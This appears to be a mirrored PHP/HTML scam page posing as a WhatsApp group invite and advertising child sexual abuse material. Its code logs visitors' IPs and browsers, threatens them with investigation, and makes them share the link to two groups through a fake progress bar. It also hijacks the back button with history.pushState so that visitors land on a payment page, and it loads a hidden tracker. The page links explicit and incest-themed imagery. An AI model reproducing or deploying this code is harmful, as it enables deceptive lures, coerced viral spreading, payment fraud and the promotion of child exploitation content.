<?php
// Define o arquivo onde os dados serão salvos
$logFile = 'logs.txt';
date_default_timezone_set('America/Sao_Paulo');

// Coleta dados do visitante
$ip = $_SERVER['REMOTE_ADDR']; // Endereço IP do visitante
$dataAcesso = date('Y-m-d H:i:s'); // Data e hora do acesso
$navegador = $_SERVER['HTTP_USER_AGENT']; // Informações do navegador

// Formata os dados para salvar no arquivo
$log = "IP: $ip | Data: $dataAcesso | Navegador: $navegador" . PHP_EOL;

// Salva os dados no arquivo
file_put_contents($logFile, $log, FILE_APPEND | LOCK_EX);

?>
<?php
// Arquivo onde o IP será salvo
$logFile = 'ips_log.txt';

// Função para obter o IP do visitante
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Função para verificar se o IP está na lista de bloqueados
function isIPBlocked($ip) {
    global $logFile;
    // Lê todos os IPs registrados no arquivo de log
    $allIPs = file_exists($logFile) ? file($logFile, FILE_IGNORE_NEW_LINES) : [];
    
    // Verifica se o IP do visitante está na lista
    foreach ($allIPs as $loggedIP) {
        // Se o IP registrado já estiver na lista, significa que ele foi bloqueado
        if (strpos($loggedIP, $ip) !== false) {
            return true;
        }
    }
    return false;
}

// Obtém o IP do visitante
$userIP = getUserIP();

// Verifica se o IP está bloqueado
if (isIPBlocked($userIP)) {
    // Redireciona o usuário para uma página de bloqueio ou exibe uma mensagem de erro
    echo "<h1>Acesso Bloqueado!</h1>";
    echo "<p>Seu IP foi bloqueado por motivos de segurança. Este site nao e acessivel a computadores! voce sera INVESTIGADO!.</p>";
    exit;
}

// Caso o IP não esteja bloqueado, continue com a lógica da página index.php
?>


<script>
    document.addEventListener("DOMContentLoaded", function() {
        // Verifica a largura da tela para determinar se é um dispositivo móvel
        if (window.innerWidth > 1024) { // Largura maior que 768px indica que é um dispositivo não móvel
            // Redireciona para outra página (por exemplo, "aviso.php")
            window.location.href = "aviso.php";
        }
        // Caso queira exibir uma mensagem para dispositivos móveis, você pode adicionar um else aqui:
        // else {
        //     document.body.innerHTML = "<h1>Bem-vindo ao site em dispositivos móveis!</h1>";
        // }
    });
</script>

<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>

<!-- SOMOS CONTRA PEDOFILIA - ISSO É UM SITE APENAS JUSTAMENTE PARA PEGAR PEDOFOLOS - GOSTARIA DE SALIENTAR QUE SEU IP FOI GRAVADO! SUA LOCALIZAÇAO E OS MEIOS QUE VOCE ACESSOU AKI! >

<!-- Mirrored from wlhatt.shop/chat-whatlsapp/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Oct 2024 22:29:12 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>

<link href='https://www.blogger.com/static/v1/widgets/466517130-widget_css_bundle_rtl.css' rel='stylesheet' type='text/css'/>
<meta content='#008069' name='theme-color'/>
<meta content='https://imgfz.com/i/gNdUnca.jpeg
' name='og:image'/>
<meta content='Group chat invite' property='og:description'/>
<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
<meta content='noindex' name='robots'/>
<link href='https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css' rel='stylesheet'/>
<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<meta content='🤩sexy videos +cp +18🤤' property='og:title'/>
<meta content='' property='og:description'/>
<title>🤩sexy videos +cp +18🤤</title>
<meta content='whatsapp.com' property='og:url'/>
<meta content='whatsapp.com' property='og:site_name'/>
<style id='page-skin-1' type='text/css'><!--
/*
body {
font: $(body.font);
color: $(body.text.color);
background: $(body.background);
padding: 0 $(content.shadow.spread) $(content.shadow.spread) $(content.shadow.spread);
$(body.background.override) margin: 0;
padding: 0;
}

--></style>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<body>
<div class='main section' id='main'><div class='widget HTML' data-version='1' id='HTML1'>
<div class='widget-content'>
<style type="text/css">
@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&amp;display=swap");
@import url("http://fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
* {
    margin: 0;
    padding: 0;
  font-family: Helvetica Neue, Helvetica Neue, Helvetica, Arial, sans-serif;
    box-sizing: border-box;
}
body {
    margin: 0px;
    background-color: #efeae2;
}
header {
    position: absolute;
    left: 0;
    top: 0;
    right: 0;
    width: 100%;
    height: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    background: rgb(0 128 105);
    color: #fff;
    justify-content: space-between;
    padding: 7px 0px;
    z-index: 1;
    box-shadow: 0px 0px 4px 0px #07241f;
}
.left {
    color: #fff;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5px;
    margin-left: 15px;
    justify-content: flex-start;
    max-width: 80%;
}
.left i {
    font-size: 17px;
}
.left img {
    max-width: 40px;
    max-height: 40px;
    border-radius: 100%;
}
.text {
    max-width: 60%;
}
.text h1 {
    font-size: 15px;
    font-weight: 600;
    max-width: 100%;
    line-height: 25px;
}
.text p {
    font-size: 10px;
    max-width: 100%;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;
}
.right {
    display: flex;
    flex-direction: row;
    align-items: center;
    margin-right: 15px;
    column-gap: 20px;
    font-size: 18px;
}
.fa-phone-plus {
    color: #fff;
    opacity: 0.5;
}
main {
    padding-top: 10vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin: 0px 15px;
}
.date {
    background: #f7ffff;
    padding: 3px 15px;
    font-size: 12px;
    font-weight: 500;
    border-radius: 8px;
    color: #444;
    box-shadow: 0px 0px 1px 0px #00000021;
    text-align: center;
}
.privacy {
    text-align: center;
    background: #feeecc;
    padding: 7px 10px;
    font-size: 10px;
    color: #666;
    margin-top: 10px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 300;
}
.activity {
    font-weight: 400 !important;
    font-size: 10px !important;
    margin-top: 10px;
    padding: 7px 7px;
}
.users {
    width: 100%;
    margin-top: 15px;
}
.user {
    position: relative;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    background: #fff;
    width: fit-content;
    padding: 5px 10px;
    border-radius: 0px 10px 10px 10px;
    margin-left: 10px;
    margin-bottom: 10px;
}
.user::before {
    content: "";
    clip-path: polygon(100% 0, 0 0, 100% 100%);
    position: absolute;
    left: -12px;
    width: 15px;
    height: 20px;
    top: -0.2px;
    display: block;
    background: #fff;
}
.number {
    display: block;
    font-weight: 600;
    font-size: 13px;
    color: #f44336;
}
.message {
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
}
.audio {
    display: flex;
    flex-direction: row;
    align-items: center;
}
.audio i {
    font-size: 22px;
    color: #77777791;
    margin-bottom: 14px;
    margin-right: 10px;
    cursor: pointer;
}
.content {
    position: relative;
    display: flex;
    flex-direction: row;
    align-items: center;
    flex-wrap: nowrap;
    justify-content: center;
    padding-left: 5px;
}
.content img {
    opacity: 0.1;
    height: 30px;
}
.details {
    width: 100%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    font-size: 10px;
    margin-top: 5px;
    color: #666;
}
.pic {
    position: relative;
    margin: 0px 5px;
    margin-left: 10px;
}
.pic img {
    max-width: 50px;
    max-height: 55px;
    border-radius: 100%;
}
.pic i {
    color: #1da959;
    text-shadow: 1px -1px 0px white, -1px -1px 0px #ffffff;
    position: absolute;
    left: 0;
    bottom: 6px;
}
.video {
    position: relative;
}
.video img {
    border-radius: 10px;
    max-width: 280px;
}
.videodetails {
    position: absolute;
    bottom: 10px;
    width: 100%;
    display: flex;
    left: 0;
    flex-direction: row;
    align-items: flex-end;
    justify-content: space-between;
    color: #fff;
    font-size: 10px;
}
.videodetails p {
    margin-right: 10px;
}
.download {
    margin-left: 10px;
    background: #00000047;
    text-align: center;
    padding: 6px 12px;
    border-radius: 10px;
    font-size: 14px;
    cursor: pointer;
}
.forward {
    font-size: 14px;
    color: #777;
    margin-left: 3px;
    margin-bottom: 3px;
    display: block;
}
.modal {
    position: fixed;
    left: 0;
    top: 0;
    background: #0000006e;
    width: 100%;
    height: 100%;
    z-index: 3;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    justify-content: flex-end;
}
.info {
    background: #fff;
    width: 100%;
    border-radius: 15px 15px 0px 0px;
    position: relative;
    text-align: center;
    padding: 10px;
}
.profile {
    display: block;
    width: 64px;
    border-radius: 32px;
    margin: 15px auto;
}
.title {
    font-size: 20px;
    padding: 6px;
}
.created {
   font-size: 13px;
    color: #747272;
}
.reactions {
    direction: ltr;
    display: inline-flex;
    align-items: center;
    margin: 10px auto;
}
.reactions img {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    box-sizing: content-box;
}
.like,
.love {
    margin-right: -5px;
    border: 2px solid #fff;
}
.love {
    z-index: 1;
}
.care {
    z-index: 2;
    border: 2px solid #fff;
}
.care1 {
    margin-left: -35px;
    z-index: 3;
}
.total {
    margin-left: -40px;
    z-index: 4;
    font-size: 14px;
    font-weight: 500;
}

#join,
#invite,
#get {
   display: block;
    width: 90%;
    height: 36px;
    color: #fff;
    border: none;
    outline: none;
    font-size: 13px;
    font-weight: bold;
   
    cursor: pointer;
    border-radius: 50px;
    padding: 0 10px;
    margin: 15px auto;
    background: #008069;
}
#join:hover {
    opacity: 0.8;
}
.talxjnt h1 {
    font-size: 19px;
    font-weight: 600;
}
.talxjnt p {
    color: #777;
    font-size: 13px;
    margin-top: 5px;
}
#share,
#offer {
    display: none;
}
.flex {
    display: flex;
    align-items: center;
    justify-content: center;
}
.bar {
    direction: ltr;
    max-width: 400px;
    margin: 10px auto;
    box-sizing: border-box;
}
.fill {
    position: relative;
    display: inline-block;
    width: calc(100% - 100px);
    height: 13px;
    padding: 2px;
    border: 1px solid #16a085;
}
#fill {
    height: 100%;
    background-color: #00a884;
    background-image: linear-gradient(-45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent);
    background-size: 30px 30px;
    animation: move 2s linear infinite;
    box-shadow: 2px 0 10px inset rgba(0, 0, 0, 0.2);
    transition: width 2s ease-out;
    width: 0%;
    transition: width 0.5s;
}
@keyframes move {
    0% {
        background-position: 0 0;
    }
    100% {
        background-position: 30px 30px;
    }
}
.percentage {
    width: 100px;
    float: right;
    height: 11px;
    font-size: 16px;
    color: #000;
   
}
#percentage {
    margin-left: 5px;
}
.loader {
    width: 20px;
    height: 20px;
    margin: 0;
    border-radius: 50%;
    border: 4px solid #ccc;
    border-top-color: #1abc9c;
    animation: spin 1s infinite linear;
}
@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}
.last {
   font-weight: 600;
   color: #f44336;
    
}
</style>
<header>
            <div class="left">
                <i class="fa-regular fa-arrow-left"></i>
                <img src="https://ilhadoporn.com/wp-content/uploads/2021/06/pai-e-filha-incesto-300x169.jpg" />
                <div class="text">
                    <h1>🤩sexy videos +cp +18🤤</h1>
                    <p>+1 (256) 296-6842, +1 (343) 303-4836, +1 (682) 200-9962</p>
                </div>
            </div>
            <div class="right">
                <i class="fa-solid fa-phone-plus"></i>
                <i class="fa-regular fa-ellipsis-vertical"></i>
            </div>
        </header>
        <main>
            <div class="date">
                <p><span id="day"></span> <span id="month"></span> <span id="year"></span></p>
            </div>
            <div class="privacy">
                <p><i class="fa-solid fa-lock"></i> WhatsApp Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.</p>
            </div>
            <div class="date activity" style="display: none;">
                <p>+1 (854) 854-4493 joined using this group's invite link</p>
            </div>
            <div class="users" id="user1" style="display: none;">
                <div class="user">
                    <div class="number">+1 (682) 200-9962</div>
                    <div class="message">
                        <div class="audio">
                            <i class="fa-solid fa-play"></i>
                            <div>
                                <div class="content">
                                    <alxbndl></alxbndl>
                                    <img src="https://i.top4top.io/p_2715lkr341.png" />
                                    <img src="https://i.top4top.io/p_2715lkr341.png" />
                                    <img src="https://i.top4top.io/p_2715lkr341.png" />
                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
                                    <img src="https://i.top4top.io/p_2715lkr341.png" />
                                </div>
                                <div class="details">
                                    <span>0.07</span>
                                    <span>23:30</span>
                                </div>
                            </div>
                        </div>
                        <div class="pic">
                            <img src="https://i.pinimg.com/236x/98/c2/b9/98c2b9acf4f1398e290e89cd32228036.jpg" />
                            <i class="fa-solid fa-microphone"></i>
                        </div>
                    </div>
                </div>
                <div class="user" id="user2" style="display: none;">
                    <div class="number" style="margin-bottom: 5px; color: #9c27b0;">+1 (343) 303-4836</div>
                    <div class="message">
                        <div class="video">
                            <img src="https://imgfz.com/i/8735pQL.jpeg" />
                            <div class="videodetails">
                                <div class="download">
                                    <i class="fa-solid fa-down"></i>
                                    <span>6,4 MB</span>
                                </div>
                                <p>23:41</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="user" id="user3" style="display: none;">
                    <div class="number" style="margin-bottom: 5px; color: #ff9800;">+1 (256) 296-6842</div>
                    <div class="forward"><i class="fa-solid fa-share"></i> <i>Forwarded</i></div>
                    <div class="message">
                        <div class="video">
                            <img src="https://imgfz.com/i/8ue0qSQ.jpeg" />
                            <div class="videodetails">
                                <div class="download">
                                    <i class="fa-solid fa-down"></i>
                                    <span>5,2 MB</span>
                                </div>
                                <p>23:41</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <div class="modal" style="display: none;">
            <div class="info">
                <div id="intro">
                    <img class="profile" src="http://imgfz.com/i/Yodjq63.jpeg" />
                    <h1 class="title">🤩sexo videos +cp +18🤤</h1>
                    <p class="created">Criado em <span id="created"></span></p>
                    <div class="reactions">
                        <img class="like" src="https://k.top4top.io/p_2715pu1ml3.jpg" />
                        <img class="love" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTz9lvxFkYOJSwt96vtaWqUq23PgtY3sYX1VeJj94Eo_t6ux1RvGZggBnE35E2dYQmpk0c&usqp=CAU" />
                        <img class="care" src="https://c.top4top.io/p_27159drlj1.png" />
                        <img class="care1" src="https://c.top4top.io/p_27159drlj1.png" />
                        <span class="total">+871</span>
                    </div>
                    <button id="join">Entrar no grupo</button>
                </div>
                <div id="share">
                    <div class="last">
                      Para entrar no grupo, compartilhe com 2 grupos e participe.
                    </div>
                    <div class="bar">
                        <div class="fill">
                            <div id="fill"></div>
                        </div>
                        <div class="percentage flex">
                            <div class="loader"></div>
                            <span id="percentage">0%</span>
                        </div>
                    </div>
                    <button id="invite">compartilhar</button>
                </div>
                <div id="offer">
                    <button id="get">Junte-se ao grupo</button>
                </div>
            </div>
        </div>
        <script>
            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

            const date = new Date();
            let day = date.getUTCDate();
            let month = months[date.getMonth()];
            let currentMonth = date.getMonth() + 1;
            let year = date.getFullYear();
            let shortyear = year.toString().slice(-2);
            document.getElementById("day").innerHTML = day;
            document.getElementById("month").innerHTML = month;
            document.getElementById("year").innerHTML = year;
            document.getElementById("created").innerHTML = currentMonth + "/" + day + "/" + shortyear;
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script>
            var width = 0,
                url = "*chat-whatsapp*%0A%0Ahttps://kwsq.shop/           %0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*Entrar agora*",
                share = "whatsapp://send?text=" + url,
                cpa = "pagamento.php";
        </script>
        <script type="text/javascript">
$(document).ready(function () {
    setTimeout(() => {
        $(".activity").show();
        setTimeout(() => {
            $("#user1").show();
            setTimeout(() => {
                $("#user2").show();
                setTimeout(() => {
                    $("#user3").show();
                    setTimeout(() => {
                        $(".modal").show();
                    }, 1000);
                }, 1000);
            }, 1000);
        }, 500);
    }, 500);
});
$("#join").click(function () {
    $("#intro").hide();
    $("#share").show();
});
$("#invite").click(function () {
    window.location.href = share;
    if (width == 0) {
        width += 40;
    } else if (width == 40) {
        width += 25;
    } else if (width == 65) {
        width += 15;
    } else if (width == 80) {
        width += 14;
    } else {
        $("#share").hide();
        $("#offer").show();
    }
    setTimeout(function () {
        $("#fill").css("width", width + "%");
        $("#percentage").text(width + "%");
    }, 2000);
});
$("#get").click(function () {
    window.open(cpa, "_blank");
});
          
   
          
          
          
          
          
          
          
          
          
          
</script>

<div style="visibility:hidden">
<center><script id="_wau47u">var _wau = _wau || []; _wau.push(["dynamic", "flormariamk1", "47u", "c4302bffffff", "small"]);</script><script async src="http://waust.at/d.js"></script></center>
</div><script></script>
</div>
<div class='clear'></div>
</div></div>

  
  
  
<script>
    window.onhashchange=function(){jp();};
    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
    function jp() {
        fh();}
    setTimeout('hh();', 500);
    function fh(){
        location.href="pagamento.php";
    }
    function goon(){
        location.href="pagamento.php";
    }
</script>

  
  
  
<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/2416879881-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY4McJbPYfhpfPDyn6p6cOYsyuDIeQ:1691240012264';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d6102935325443652454','http://whatssaop-chatqsds.blogspot.com/','6102935325443652454');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '6102935325443652454', 'title': 'Schooll\ud83d\udd1egirl\ud83e\udd74', 'url': 'https://whatssaop-chatqsds.blogspot.com/', 'canonicalUrl': 'https://whatssaop-chatqsds.blogspot.com/', 'homepageUrl': 'https://whatssaop-chatqsds.blogspot.com/', 'searchUrl': 'https://whatssaop-chatqsds.blogspot.com/search', 'canonicalHomepageUrl': 'https://whatssaop-chatqsds.blogspot.com/', 'blogspotFaviconUrl': 'https://whatssaop-chatqsds.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'ar', 'localeUnderscoreDelimited': 'ar', 'languageDirection': 'rtl', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Schooll\ud83d\udd1egirl\ud83e\udd74 - Atom\x22 href\x3d\x22https://whatssaop-chatqsds.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Schooll\ud83d\udd1egirl\ud83e\udd74 - RSS\x22 href\x3d\x22https://whatssaop-chatqsds.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Schooll\ud83d\udd1egirl\ud83e\udd74 - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/6102935325443652454/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/16777896498766012594\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/5d50d09024822f63', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'blitzPostInterstitial': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': '\u0627\u0644\u062d\u0635\u0648\u0644 \u0639\u0644\u0649 \u0627\u0644\u0631\u0627\u0628\u0637', 'key': 'link', 'shareMessage': '\u0627\u0644\u062d\u0635\u0648\u0644 \u0639\u0644\u0649 \u0627\u0644\u0631\u0627\u0628\u0637', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': '\u0645\u0634\u0627\u0631\u0643\u0629 \u0625\u0644\u0649 Facebook', 'target': 'facebook'}, {'name': '\u0643\u062a\u0627\u0628\u0629 \u0645\u062f\u0648\u0646\u0629 \u062d\u0648\u0644 \u0647\u0630\u0647 \u0627\u0644\u0645\u0634\u0627\u0631\u0643\u0629', 'key': 'blogThis', 'shareMessage': '\u0643\u062a\u0627\u0628\u0629 \u0645\u062f\u0648\u0646\u0629 \u062d\u0648\u0644 \u0647\u0630\u0647 \u0627\u0644\u0645\u0634\u0627\u0631\u0643\u0629', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': '\u0645\u0634\u0627\u0631\u0643\u0629 \u0625\u0644\u0649 Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': '\u0645\u0634\u0627\u0631\u0643\u0629 \u0625\u0644\u0649 Pinterest', 'target': 'pinterest'}, {'name': '\u0628\u0631\u064a\u062f \u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a', 'key': 'email', 'shareMessage': '\u0628\u0631\u064a\u062f \u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27ar\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': '\u0642\u0631\u0627\u0621\u0629 \u0627\u0644\u0645\u0632\u064a\u062f', 'pageType': 'index', 'pageName': '', 'pageTitle': 'Schooll\ud83d\udd1egirl\ud83e\udd74'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': '\u062a\u0639\u062f\u064a\u0644', 'linkCopiedToClipboard': '\u062a\u0645 \u0646\u0633\u062e \u0627\u0644\u0631\u0627\u0628\u0637 \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629', 'ok': '\u062d\u0633\u0646\u064b\u0627', 'postLink': '\u0631\u0627\u0628\u0637 \u0627\u0644\u0645\u0634\u0627\u0631\u0643\u0629'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': '\u0645\u062e\u0635\u0635', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Schooll\ud83d\udd1egirl\ud83e\udd74', 'description': '', 'url': 'https://whatssaop-chatqsds.blogspot.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'main', document.getElementById('HTML1'), {}, 'displayModeFull'));
</script>
</body>

<!-- Mirrored from wlhatt.shop/chat-whatlsapp/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Oct 2024 22:29:12 GMT -->
</html>